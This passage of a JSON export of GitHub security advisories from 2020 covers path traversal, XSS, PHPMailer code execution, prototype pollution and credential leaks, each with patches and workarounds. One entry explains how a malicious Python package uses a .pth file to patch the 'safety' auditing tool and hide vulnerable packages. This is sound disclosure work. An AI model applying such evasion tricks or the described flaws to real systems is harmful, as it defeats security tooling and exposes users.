    "description": "### Impact\n\nThis vulnerability applies to all users of:\n* `org.http4s.server.staticcontent.FileService`\n* `org.http4s.server.staticcontent.ResourceService`\n* `org.http4s.server.staticcontent.WebjarService`\n\n#### Path escaping\n\nURI normalization is applied incorrectly.  Requests whose path info contain `../` or `//` can expose resources outside of the configured location.  Specifically:\n\n* `FileService` may expose any file on the local file system.\n* `ResourceService` may expose any resource on the class path.\n\n#### Prefix matching\n\nWhen the service is configured with a non-empty `pathPrefix` that doesn't end in a slash, any directories whose names are a prefix of `systemPath` (from `FileService`) or `pathPrefix` (from `ResourceService`) are exposed.  For example, if `pathPrefix` is `/foo` and `systemPath` is `/bar`, a request to `/foobaz/quux.txt` exposes file `/barbaz/quux.txt`, when only files beneath `/bar` should be available.\n\n#### URI decoding\n\nURI segments are not decoded before resource resolution.  This causes resources with reserved characters in their name to incorrectly return a 404.  It also may incorrectly expose the rare resource whose name is URI encoded.  This applies to `FileService`, `ResourceService`, and `WebjarService`.\n\n### Patches\n\nIn all three services, paths with an empty segment, a `.` segment, or a `..` segment are now rejected with a `400 Bad Request` response.  This fixes exposure outside the configured root.  Many clients already eliminate dot segments according to the rules in [RFC3986, Section 5.2.4](https://tools.ietf.org/html/rfc3986#section-5.2.4).  A middleware that does so at the server level may be considered if there is demand.\n\nIf `pathInfo` is non-empty, and does not begin with `/`, then a 404 response is generated.  This fixes the prefix matching exposure.\n\nAll path segments are URI decoded before being passed to the file system or resource path.  This allows resolution of resources with reserved characters in the name, and prevents incorrect exposure of resources whose names are themselves URI encoded.\n\n### Workarounds\n\nThe recommended course is to upgrade:\n* v0.18.26, binary compatible with the 0.18.x series\n* v0.20.20, binary compatible with the 0.20.x series\n* v0.21.2, binary compatible with the 0.21.x series\n\nNote that 0.19.0 is a deprecated release and has never been supported.\n\nIf an upgrade is impossible:\n\n* Temporarily copy `FileService.scala`, `ResourceService.scala`, and `WebjarService.scala` from the appropriate release series into your project and recompile with that, changing the package name and reference in your application.\n* Users of a servlet backend can use the servlet container's file serving capabilities.\n\n### Credits\n\nThank you to Thomas Gøytil for the discovery, responsible disclosure, and assistance testing of this vulnerability.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [http4s/http4s](http://github.com/http4s/http4s)\n* Email a maintainer:\n  * [Ross A. Baker](mailto:ross@rossabaker.com)",
    "summary": "Local file inclusion vulnerability in http4s"
  },
  {
    "ghsaId": "GHSA-g6j2-ch25-5mmv",
    "publishedAt": "2020-03-25T16:52:49Z",
    "description": "### Impact\nToken Replay Detection is an important defence in depth measure for Single Sign On solutions. In all previous 2.X versions, the Token Replay Detection is not properly implemented. \n\nNote that version 1.0.1 is not affected. It has a correct Token Replay Implementation and is safe to use.\n\n### Patches\nThe 2.5.0 version is patched.\n\n### Workarounds\nThere are no workarounds with existing versions. Fixing the issue requires code updates.\n\n### References\nhttps://en.wikipedia.org/wiki/Replay_attack\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Comment on #711.\n* Email us at [security@sustainsys.com](mailto:security@susatinsys.com) if you think that there are further security issues.",
    "summary": "Missing Token Replay Detection in Saml2 Authentication services for ASP.NET"
  },
  {
    "ghsaId": "GHSA-vg44-fw64-cpjx",
    "publishedAt": "2020-03-24T15:08:59Z",
    "description": "### Impact\n\nAnybody using this library to sign with a BIP44 account other than the first account may be affected. If a user is signing with the first account (i.e. the account at index `0`), or with the legacy MEW/MyCrypto HD path, they are not affected.\n\nThe vulnerability impacts cases where the user signs a personal message or transaction without first adding the account. This includes cases where the user has already added the account in a previous session (i.e. they added the account, reset the application, then signed something). The serialization/deserialization process does restore a previously added account, but it doesn&#39;t restore the index instructing the keyring to use that account for signing. As a result, after serializing then deserializing the keyring state, the account at index `0` is always used for signing even if it isn&#39;t the current account.\n\n### Patches\n\nThis has been patched ([#14](https://github.com/MetaMask/eth-ledger-bridge-keyring/pull/14)) in version &gt;=0.2.1 of [`eth-ledger-bridge-keyring`](https://www.npmjs.com/package/eth-ledger-bridge-keyring), and in version &gt;=0.2.2 of [`@metamask/eth-ledger-bridge-keyring`](https://www.npmjs.com/package/@metamask/eth-ledger-bridge-keyring). Users are encouraged to migrate to the new package name.\n\n### Workarounds\n\nTo work around this problem without updating, you should remove then re-add the account before use. As long as the account was added during the lifetime of that process, signing with that account should work correctly.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [MetaMask/eth-ledger-bridge-keyring on GitHub](https://github.com/MetaMask/eth-ledger-bridge-keyring)\n* Email the MetaMask team at [hello@metamask.io](mailto:hello@metamask.io)",
    "summary": "Incorrect Account Used for Signing"
  },
  {
    "ghsaId": "GHSA-7q25-qrjw-6fg2",
    "publishedAt": "2020-03-24T15:07:56Z",
    "description": "# Python Auditing Vulnerability\n\nDemonstrates how a malicious package can insert a load-time poison pill to avoid detection by tools like Safety.\n\nTools that are designed to find vulnerable packages can not ever run in the same python environment that they are trying to protect.\n\n## Usage\n\nInstall `safety`, `insecure-package`, and this package with pip in the same python environment. Order doesn&amp;#39;t matter.\n\n1. pip install safety\n2. pip install insecure-package\n3. pip install dist/malicious-0.1-py3-none-any.whl\n\nRun the check\n\n4. `safety check`\n\nYou should see both `Running my modified safety.check` and that `insecure-package` is not listed in the results!\n\n\n## How it Works\n\nEverything in Python is mutable. The trick is getting some code to run at interpreter load time in order to do some patching.\n\n1. When you install this package, the `setup.py` settings installs a `malicious.pth` file to your `site-packages` directory.\n2. The `malicious.pth` file gets loaded anytime Python starts, which in turn imports our `malicious` package.\n3. The `malicious/__init__.py` patches the safety library with a custom function to avoid detection.",
    "summary": "Malicious package may avoid detection in python auditing"
  },
  {
    "ghsaId": "GHSA-m6xf-fq7q-8743",
    "publishedAt": "2020-03-24T15:06:32Z",
    "description": "### Impact\n\nA [mutation XSS](https://cure53.de/fp170.pdf) affects users calling `bleach.clean` with all of:\n\n* the `svg` or `math` in the allowed/whitelisted tags\n* an RCDATA tag (see below) in the allowed/whitelisted tags\n* the keyword argument `strip=False`\n\n### Patches\n\nUsers are encouraged to upgrade to bleach v3.1.2 or greater.\n\n### Workarounds\n\n* modify `bleach.clean` calls to use `strip=True`, or not whitelist `math` or `svg` tags and one or more of the following tags:\n\n```\nscript\nnoscript\nstyle\nnoframes\nxmp\nnoembed\niframe\n```\n\n* A strong [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) without `unsafe-inline` and `unsafe-eval` [`script-src`s](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)) will also help mitigate the risk.\n\n### References\n\n* https://bugzilla.mozilla.org/show_bug.cgi?id=1621692\n* https://cure53.de/fp170.pdf\n* https://nvd.nist.gov/vuln/detail/CVE-2020-6816\n* https://www.checkmarx.com/blog/vulnerabilities-discovered-in-mozilla-bleach\n\n### Credits\n\n* Reported by Yaniv Nizry from the CxSCA AppSec group at Checkmarx\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue at [https://github.com/mozilla/bleach/issues](https://github.com/mozilla/bleach/issues)\n* Email us at [security@mozilla.org](mailto:security@mozilla.org)",
    "summary": "mutation XSS via whitelisted math or svg and raw tag in Bleach"
  },
  {
    "ghsaId": "GHSA-65cv-r6x7-79hv",
    "publishedAt": "2020-03-19T17:30:29Z",
    "description": "There is a possible XSS vulnerability in ActionView's JavaScript literal escape helpers.  Views that use the `j` or `escape_javascript` methods may be susceptible to XSS attacks.\n\n### Impact\n\nThere is a possible XSS vulnerability in the `j` and `escape_javascript` methods in ActionView.  These methods are used for escaping JavaScript string literals.  Impacted code will look something like this:\n\n```erb\n<script>let a = `<%= j unknown_input %>`</script>\n```\n\nor\n\n```erb\n<script>let a = `<%= escape_javascript unknown_input %>`</script>\n```\n\n### Releases\n\nThe 6.0.2.2 and 5.2.4.2 releases are available at the normal locations.\n\n### Workarounds\n\nFor those that can't upgrade, the following monkey patch may be used:\n\n```ruby\nActionView::Helpers::JavaScriptHelper::JS_ESCAPE_MAP.merge!(\n  {\n    \"`\" => \"\\\\`\",\n    \"$\" => \"\\\\$\"\n  }\n)\n\nmodule ActionView::Helpers::JavaScriptHelper\n  alias :old_ej :escape_javascript\n  alias :old_j :j\n\n  def escape_javascript(javascript)\n    javascript = javascript.to_s\n    if javascript.empty?\n      result = \"\"\n    else\n      result = javascript.gsub(/(\\\\|<\\/|\\r\\n|\\342\\200\\250|\\342\\200\\251|[\\n\\r\"']|[`]|[$])/u, JS_ESCAPE_MAP)\n    end\n    javascript.html_safe? ? result.html_safe : result\n  end\n\n  alias :j :escape_javascript\nend\n```\n\n### Patches\n\nTo aid users who aren't able to upgrade immediately we have provided patches for\nthe two supported release series. They are in git-am format and consist of a\nsingle changeset.\n\n* [5-2-js-helper-xss.patch](https://gist.github.com/tenderlove/c042ff49f0347c37e99183a6502accc6#file-5-2-js-helper-xss-patch) - Patch for 5.2 series\n* [6-0-js-helper-xss.patch](https://gist.github.com/tenderlove/c042ff49f0347c37e99183a6502accc6#file-6-0-js-helper-xss-patch) - Patch for 6.0 series\n\nPlease note that only the 5.2 and 6.0 series are supported at present. Users\nof earlier unsupported releases are advised to upgrade as soon as possible as we\ncannot guarantee the continued availability of security fixes for unsupported\nreleases.\n\n### Credits\n\nThanks to Jesse Campos from Chef Secure",
    "summary": "Possible XSS vulnerability in ActionView"
  },
  {
    "ghsaId": "GHSA-2wx6-wc87-rmjm",
    "publishedAt": "2020-03-19T17:29:58Z",
    "description": "In EasyBuild before version 4.1.2, the GitHub Personal Access Token (PAT) used by EasyBuild for the GitHub integration \nfeatures (like `--new-pr`, `--fro,-pr`, etc.) is shown in plain text in EasyBuild debug log files.\n\nThis issue is fixed in EasyBuild v4.1.2, and in the `master`+  `develop` branches of the `easybuild-framework` repository.",
    "summary": "GitHub personal access token leaking into temporary EasyBuild (debug) logs"
  },
  {
    "ghsaId": "GHSA-pq4w-qm9g-qx68",
    "publishedAt": "2020-03-16T22:46:50Z",
    "description": "### Impact\nCredential replay affecting those connected to a server when *all 3* of the following conditions are met:\n- `SecurityPolicy` is `None`\n- using username/password or X509-based authentication\n- the server has a defect causing it to send null/empty or zeroed nonces \n\n### Patches\nThe problem has been patched in version `0.3.6`. A more relaxed treatment of validation as agreed upon by the OPC UA Security Working Group is implemented in version `0.3.7`.\n\n### Workarounds\nDo not use username/password or X509-based authentication with `SecurityPolicy` of `None`.\n\n### References\nhttps://opcfoundation.org/SecurityBulletins/OPC%20Foundation%20Security%20Bulletin%20CVE-2019-19135.pdf\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue at [https://github.com/eclipse/milo/issues](https://github.com/eclipse/milo/issues)\n* Email [the mailing list](mailto:milo-dev@eclipse.org)",
    "summary": "Insufficient Nonce Validation in Eclipse Milo Client"
  },
  {
    "ghsaId": "GHSA-22jr-vc7j-g762",
    "publishedAt": "2020-03-16T22:46:19Z",
    "description": "### Impact\nAn issue was discovered in psd-tools before 1.9.4.\nThe Cython implementation of RLE decoding did not check for malformed PSD input data\nduring decoding to the PIL.Image or NumPy format, leading to a Buffer Overflow.\n\n### Patches\nUsers of psd-tools version v1.8.37 to v1.9.3 should upgrade to v1.9.4.\n\n### Workarounds\nWithout Cython present on installation, buffer overflow does not occur but IndexError will be thrown. However, already installed psd-tools with Cython extention should be upgraded.\n\n### References\nhttps://github.com/psd-tools/psd-tools/pull/198\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [psd-tools](https://github.com/psd-tools/psd-tools/issues)",
    "summary": "Potential buffer overflow in psd-tools"
  },
  {
    "ghsaId": "GHSA-9gjv-6qq6-v7qm",
    "publishedAt": "2020-03-13T21:18:55Z",
    "description": "### Impact\nAny user with access to the CMS can view and delete other users&#39; 2FA devices by going to the correct path. The user does not require special permissions in order to do so. By deleting the other user&#39;s device they can disable the target user&#39;s 2FA devices and potentially compromise the account if they figure out their password.\n\n### Patches\nThe problem has been patched in version 1.4.1.\n\n### Workarounds\nThere is no workaround for this issue.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [github.com/labd/wagtail-2fa](https://github.com/labd/wagtail-2fa)\n* Email us at [security@labdigital.nl](mailto:security@labdigital.nl)",
    "summary": "2FA bypass through deleting devices in wagtail-2fa"
  },
  {
    "ghsaId": "GHSA-2p5p-m353-833w",
    "publishedAt": "2020-03-13T21:05:44Z",
    "description": "In Administrate (rubygem) before version 0.13.0, when sorting by attributes on a dashboard,\nthe direction parameter was not validated before being interpolated into the SQL query.\nThis could present a SQL injection if the attacker were able to modify the `direction` parameter and bypass ActiveRecord SQL protections.\n\nWhilst this does have a high-impact, to exploit this you need access to the Administrate dashboards, which we would expect to be behind authentication.\n\nThis is patched in wersion 0.13.0.",
    "summary": "Sort order SQL injection in Administrate"
  },
  {
    "ghsaId": "GHSA-7fhm-mqm4-2wp7",
    "publishedAt": "2020-03-13T20:36:16Z",
    "description": "**Withdrawn**\nGitHub has withdrawn this advisory in place of GHSA-vh95-rmgr-6w4m and GHSA-6chw-6frg-f759.\nThe reason for withdrawing is that some mistakes were made during the ingestion of CVE-2020-7598\nwhich caused this advisory to be published with incorrect information.\n\nIn order to provide accurate advisory information, new advisories were created:\n\n- minimist: https://github.com/advisories/GHSA-vh95-rmgr-6w4m\n- acorn: https://github.com/advisories/GHSA-6chw-6frg-f759",
    "summary": "Withdrawn: ESLint dependencies are vulnerable (ReDoS and Prototype Pollution)"
  },
  {
    "ghsaId": "GHSA-g9rq-x4fj-f5hx",
    "publishedAt": "2020-03-13T20:21:27Z",
    "description": "### Impact\n\nA user could upload PHP files through image upload functions, which would allow them to execute code on the host system remotely. They would then have the permissions of the PHP process.\n\nThis most impacts scenarios where non-trusted users are given permission to upload images in any area of the application. \n\n### Patches\n\nThe issue was addressed in a series of patches: v0.25.3, v0.25.4 and v0.25.5.\nUsers should upgrade to at least v0.25.5 to avoid this patch but ideally the latest BookStack version as previous versions are un-supported.\n\n### Workarounds\n\nDepending on BookStack version, you could use the [local_secure](https://www.bookstackapp.com/docs/admin/upload-config/#local-secure) image storage option, or use s3 or a similar compatible service.\n\nPreventing direct execution of any `php` files, apart from the `public/index.php` file, though web-server configuration would also prevent this.\n\n### References\n\n[BookStack Beta v0.25.3](https://github.com/BookStackApp/BookStack/releases/tag/v0.25.3)\n[BookStack Beta v0.25.4](https://github.com/BookStackApp/BookStack/releases/tag/v0.25.4)\n[BookStack Beta v0.25.5](https://github.com/BookStackApp/BookStack/releases/tag/v0.25.5)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [the BookStack GitHub repository](BookStackApp/BookStack/issues).\n* Ask on the [BookStack Discord chat](https://discord.gg/ztkBqR2).\n* Follow the [BookStack Security advise](https://github.com/BookStackApp/BookStack#-security) to contact someone privately.",
    "summary": "Remote Code Execution Through Image Uploads in BookStack"
  },
  {
    "ghsaId": "GHSA-qh62-ch95-63wh",
    "publishedAt": "2020-03-13T20:05:10Z",
    "description": "**Withdrawn:** Duplicate of GHSA-2fch-jvg5-crf6",
    "summary": "python-gnupg allows context-dependent attackers to trick gnupg to decrypt other ciphertext than intended"
  },
  {
    "ghsaId": "GHSA-cg75-6938-wx58",
    "publishedAt": "2020-03-13T20:04:51Z",
    "description": "python-docutils allows insecure usage of temporary files",
    "summary": "python-docutils allows insecure usage of temporary files"
  },
  {
    "ghsaId": "GHSA-qfc5-mcwq-26q8",
    "publishedAt": "2020-03-12T17:02:50Z",
    "description": "psutil (aka python-psutil) through 5.6.5 can have a double free. This occurs because of refcount mishandling within a while or for loop that converts system data into a Python object.",
    "summary": "Double Free in psutil"
  },
  {
    "ghsaId": "GHSA-xf8c-3cgx-fcwm",
    "publishedAt": "2020-03-12T16:54:06Z",
    "description": "A flaw was discovered in the python-novajoin plugin, all versions up to, excluding 1.1.1, for Red Hat OpenStack Platform. The novajoin API lacked sufficient access control, allowing any keystone authenticated user to generate FreeIPA tokens.",
    "summary": "Improper Access Control in novajoin"
  },
  {
    "ghsaId": "GHSA-p86x-652p-6385",
    "publishedAt": "2020-03-11T21:36:38Z",
    "description": "Python keyring lib before 0.10 created keyring files with world-readable permissions.",
    "summary": "Incorrect Default Permissions in keyring"
  },
  {
    "ghsaId": "GHSA-m8qc-mf6p-pfq9",
    "publishedAt": "2020-03-11T20:56:34Z",
    "description": "python-rply before 0.7.4 insecurely creates temporary files.",
    "summary": "Link Following in rply"
  },
  {
    "ghsaId": "GHSA-8867-vpm3-g98g",
    "publishedAt": "2020-03-10T20:56:41Z",
    "description": "Python keyring has insecure permissions on new databases allowing world-readable files to be created",
    "summary": "Incorrect Default Permissions in keyring"
  },
  {
    "ghsaId": "GHSA-9vg3-cf92-h2h7",
    "publishedAt": "2020-03-10T20:39:05Z",
    "description": "python-keystoneclient version 0.2.3 to 0.2.5 has middleware memcache signing bypass",
    "summary": "Insufficient Verification of Data Authenticity in python-keystoneclient"
  },
  {
    "ghsaId": "GHSA-3hw5-q855-g6cw",
    "publishedAt": "2020-03-10T18:03:32Z",
    "description": "The Dojox jQuery wrapper `jqMix` mixin method is vulnerable to Prototype Pollution. \n\nAffected Area:\n```\n //https://github.com/dojo/dojox/blob/master/jq.js#L442\n\t\tvar tobj = {};\n\t\tfor(var x in props){\n\t\t\t// the \"tobj\" condition avoid copying properties in \"props\"\n\t\t\t// inherited from Object.prototype.  For example, if obj has a custom\n\t\t\t// toString() method, don't overwrite it with the toString() method\n\t\t\t// that props inherited from Object.prototype\n\t\t\tif((tobj[x] === undefined || tobj[x] != props[x]) && props[x] !== undefined && obj != props[x]){\n\t\t\t\tif(dojo.isObject(obj[x]) && dojo.isObject(props[x])){\n\t\t\t\t\tif(dojo.isArray(props[x])){\n\t\t\t\t\t\tobj[x] = props[x];\n\t\t\t\t\t}else{\n\t\t\t\t\t\tobj[x] = jqMix(obj[x], props[x]);\n\t\t\t\t\t}\n\t\t\t\t}else{\n\t\t\t\t\tobj[x] = props[x];\n\t\t\t\t}\n```",
    "summary": "Prototype Pollution in Dojox"
  },
  {
    "ghsaId": "GHSA-jxfh-8wgv-vfr2",
    "publishedAt": "2020-03-10T18:03:14Z",
    "description": "In affected versions of dojo (NPM package), the deepCopy method is vulnerable to Prototype Pollution.\n\nPrototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects.\nAn attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values. \n\nThis has been patched in versions 1.12.8, 1.13.7, 1.14.6, 1.15.3 and 1.16.2",
    "summary": "Prototype pollution in dojo"
  },
  {
    "ghsaId": "GHSA-pcqq-5962-hvcw",
    "publishedAt": "2020-03-10T18:02:49Z",
    "description": "### Impact\nSome regexes are vulnerable to regular expression denial of service (REDoS) due to overlapping capture groups. This allows remote attackers to overload a server by setting the User-Agent header in an HTTP(S) request to maliciously crafted long strings.\n\n### Patches\nPlease update `uap-ruby` to &gt;= v2.6.0\n\n### For more information\nhttps://github.com/ua-parser/uap-core/security/advisories/GHSA-cmcx-xhr8-3w9p\n\nReported in `uap-core` by Ben Caller @bcaller",
    "summary": "Denial of Service in uap-core when processing crafted User-Agent strings"
  },
  {
    "ghsaId": "GHSA-wh37-37xw-54hr",
    "publishedAt": "2020-03-10T18:02:31Z",
    "description": "python-requests-Kerberos through 0.5 does not handle mutual authentication",
    "summary": "Improper Authentication in requests-kerberos"
  },
  {
    "ghsaId": "GHSA-p94w-42g3-f7h4",
    "publishedAt": "2020-03-06T01:16:00Z",
    "description": "### Impact\nThe [`verifyVerifiableCredential()`](https://github.com/rabobank-blockchain/vp-toolkit/blob/master/src/service/signers/verifiable-credential-signer.ts#L57) method check the cryptographic integrity of the Verifiable Credential, but it does not check if the [`credential.issuer`](https://github.com/rabobank-blockchain/vp-toolkit-models/blob/develop/src/model/verifiable-credential.ts#L129) DID matches the signer of the credential.\n\nThe **verifier** is impacted by this vulnerability.\n\n### Patches\nPatch will be available in version 0.2.2.\n\n### Workarounds\nIn case you trust certain issuers for certain credentials as a verifier, trust the issuer&#39;s public key from the `credential.proof.verificationMethod` field.\n\n### References\n[Github issue](https://github.com/rabobank-blockchain/vp-toolkit/issues/13)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Discuss in the existing [issue](https://github.com/rabobank-blockchain/vp-toolkit/issues/13)\n* [Contact me](https://github.com/rabomarnix)",
    "summary": "Holder can (re)create authentic credentials after receiving a credential in vp-toolkit"
  },
  {
    "ghsaId": "GHSA-ff5x-w9wg-h275",
    "publishedAt": "2020-03-06T01:15:46Z",
    "description": "### Impact\nThe [`verifyVerifiablePresentation()`](https://github.com/rabobank-blockchain/vp-toolkit/blob/master/src/service/signers/verifiable-presentation-signer.ts#L97) method check the cryptographic integrity of the Verifiable Presentation, but it does not check if the [`credentialSubject.id`](https://github.com/rabobank-blockchain/vp-toolkit-models/blob/develop/src/model/verifiable-credential.ts#L150) DID matches the signer of the VP proof.\n\nThe **verifier** is impacted by this vulnerability.\n\n### Patches\nPatch will be available in version 0.2.2.\n\n### Workarounds\n- Compute the address out of the `verifiablePresentation.proof.n.verificationMethod` using `getAddressFromPubKey()` from `crypt-util@0.1.5` and match it with the `credentialSubject.id` address from the credential.\n\n### References\n[Github issue](https://github.com/rabobank-blockchain/vp-toolkit/issues/14)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Discuss in the existing [issue](https://github.com/rabobank-blockchain/vp-toolkit/issues/14)\n* [Contact me](https://github.com/rabomarnix)",
    "summary": "Holder can generate proof of ownership for credentials it does not control in vp-toolkit"
  },
  {
    "ghsaId": "GHSA-738m-f33v-qc2r",
    "publishedAt": "2020-03-05T22:09:19Z",
    "description": "### Impact\nAttackers could inject arbitrary SMTP commands via by exploiting the fact that valid email addresses may contain line breaks, which are not handled correctly in some contexts.\n\n### Patches\nFixed in 5.2.14 in [this commit](https://github.com/PHPMailer/PHPMailer/commit/6687a96a18b8f12148881e4ddde795ae477284b0).\n\n### Workarounds\nManually strip line breaks from email addresses before passing them to PHPMailer.\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2015-8476\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a private issue in [the PHPMailer project](https://github.com/PHPMailer/PHPMailer)",
    "summary": "SMTP Injection in PHPMailer"
  },
  {
    "ghsaId": "GHSA-5f37-gxvh-23v6",
    "publishedAt": "2020-03-05T22:09:17Z",
    "description": "### Impact\nThe `mailSend` function in the default `isMail` transport in PHPMailer before 5.2.18 might allow remote attackers to pass extra parameters to the mail command and consequently execute arbitrary code via a \\&quot; (backslash double quote) in a crafted `Sender` property.\n\n### Patches\nFixed in 5.2.18\n\n### Workarounds\nFilter and validate user input before passing it to internal functions.\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2016-10033\nRelated to a follow-on issue in https://nvd.nist.gov/vuln/detail/CVE-2016-10045\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a private issue in [the PHPMailer project](https://github.com/PHPMailer/PHPMailer)",
    "summary": "Remote code execution in PHPMailer"
  },
  {
    "ghsaId": "GHSA-4pc3-96mx-wwc8",
    "publishedAt": "2020-03-05T22:09:14Z",
    "description": "### Impact\nThe `isMail` transport in PHPMailer before 5.2.20 might allow remote attackers to pass extra parameters to the `mail` command and consequently execute arbitrary code by leveraging improper interaction between the `escapeshellarg` function and internal escaping performed in the mail function in PHP. NOTE: this vulnerability exists because of an incorrect fix for CVE-2016-10033.\n\nThis issue really emphasises that it&#39;s worth avoiding the built-in PHP `mail()` function entirely.\n\n### Patches\nFixed in 5.2.20\n\n### Workarounds\nSend via SMTP to localhost instead of calling the `mail()` function.\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2016-10045\nSee also https://nvd.nist.gov/vuln/detail/CVE-2016-10033\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a private issue in [the PHPMailer project](https://github.com/PHPMailer/PHPMailer)",
    "summary": "Remote code execution in PHPMailer"
  },
  {
    "ghsaId": "GHSA-58mj-pw57-4vm2",
    "publishedAt": "2020-03-05T22:09:13Z",
    "description": "PHPMailer versions prior to 5.2.24 (released July 26th 2017) have an XSS vulnerability in one of the code examples, CVE-2017-11503. The code_generator.phps example did not filter user input prior to output. This file is distributed with a `.phps` extension, so it it not normally executable unless it is explicitly renamed, and the file is not included when PHPMailer is loaded through composer, so it is safe by default. There was also an undisclosed potential XSS vulnerability in the default exception handler (unused by default). Patches for both issues kindly provided by Patrick Monnerat of the Fedora Project.\n\n### Impact\nPHPMailer 5.2.23 has XSS in the &quot;From Email Address&quot; and &quot;To Email Address&quot; fields of code_generator.php.\n\n### Patches\nFixed in 5.2.24\n\n### Workarounds\nNone.\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2017-11503\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a private issue in [the PHPMailer project](https://github.com/PHPMailer/PHPMailer)",
    "summary": "Cross-site scripting in PHPMailer"
  },
  {
    "ghsaId": "GHSA-4x5h-cr29-fhp6",
    "publishedAt": "2020-03-05T22:09:10Z",
    "description": "An issue was discovered in PHPMailer before 5.2.22. PHPMailer&#39;s `msgHTML` method applies transformations to an HTML document to make it usable as an email message body. One of the transformations is to convert relative image URLs into attachments using a script-provided base directory. If no base directory is provided, it resolves to `/`, meaning that relative image URLs get treated as absolute local file paths and added as attachments. To form a remote vulnerability, the msgHTML method must be called, passed an unfiltered, user-supplied HTML document, and must not set a base directory.\n\n### Impact\nArbitrary local files can be attached to email messages.\n\n### Patches\nFixed in 5.2.22\n\n### Workarounds\nValidate input before using user-supplied file paths.\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2017-5223\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a private issue in [the PHPMailer project](https://github.com/PHPMailer/PHPMailer)",
    "summary": "Local file disclosure in PHPMailer"
  },
  {
    "ghsaId": "GHSA-7w4p-72j7-v7c2",
    "publishedAt": "2020-03-05T22:08:55Z",
    "description": "PHPMailer versions prior to 6.0.6 and 5.2.27 are vulnerable to an object injection attack by passing phar:// paths into `addAttachment()` and other functions that may receive unfiltered local paths, possibly leading to RCE. See [this article](https://knasmueller.net/5-answers-about-php-phar-exploitation) for more info on this type of vulnerability. Mitigated by blocking the use of paths containing URL-protocol style prefixes such as `phar://`. Reported by Sehun Oh of cyberone.kr.\n\n### Impact\nObject injection, possible remote code execution\n\n### Patches\nFixed in 6.0.6 and 5.2.27\n\n### Workarounds\nValidate and sanitise user input before using.\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2018-19296\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a private issue in [the PHPMailer project](https://github.com/PHPMailer/PHPMailer)",
    "summary": "Phar object injection in PHPMailer"
  },
  {
    "ghsaId": "GHSA-4w82-r329-3q67",
    "publishedAt": "2020-03-04T20:52:14Z",
    "description": "FasterXML jackson-databind 2.0.0 through 2.9.10.2 lacks certain xbean-reflect/JNDI blocking, as demonstrated by org.apache.xbean.propertyeditor.JndiConverter.",
    "summary": "Deserialization of Untrusted Data in jackson-databind"
  },
  {
    "ghsaId": "GHSA-gww7-p5w4-wrfv",
    "publishedAt": "2020-03-04T20:52:11Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.2 lacks certain net.sf.ehcache blocking.",
    "summary": "Deserialization of Untrusted Data in jackson-databind"
  },
  {
    "ghsaId": "GHSA-h4mf-75hf-67w4",
    "publishedAt": "2020-03-04T20:20:27Z",
    "description": "In parser-server before version 4.1.0, you can fetch all the users objects, by using regex in the NoSQL query.\nUsing the NoSQL, you can use a regex on sessionToken and find valid accounts this way.",
    "summary": "Information disclosure in parse-server"
  },
  {
    "ghsaId": "GHSA-33vf-4xgg-9r58",
    "publishedAt": "2020-03-03T23:33:16Z",
    "description": "### Impact\nIf an application using Puma allows untrusted input in an early-hints header, an attacker can use a carriage return character to end the header and inject malicious content, such as additional headers or an entirely new response body. This vulnerability is known as [HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)\n\nWhile not an attack in itself, response splitting is a vector for several other attacks, such as cross-site scripting (XSS).\n\nThis is related to [CVE-2020-5247](https://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v), which fixed this vulnerability but only for regular responses.\n\n### Patches\nThis has been fixed in 4.3.3 and 3.12.4.\n\n### Workarounds\nUsers can not allow untrusted/user input in the Early Hints response header.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [puma](https://github.com/puma/puma)\n* Email us a project maintainer. [Email addresses are listed in our Code of Conduct](https://github.com/puma/puma/blob/master/CODE_OF_CONDUCT.md#enforcement).",
    "summary": "HTTP Response Splitting (Early Hints) in Puma"
  },
  {
    "ghsaId": "GHSA-6v7p-v754-j89v",
    "publishedAt": "2020-03-03T15:32:03Z",
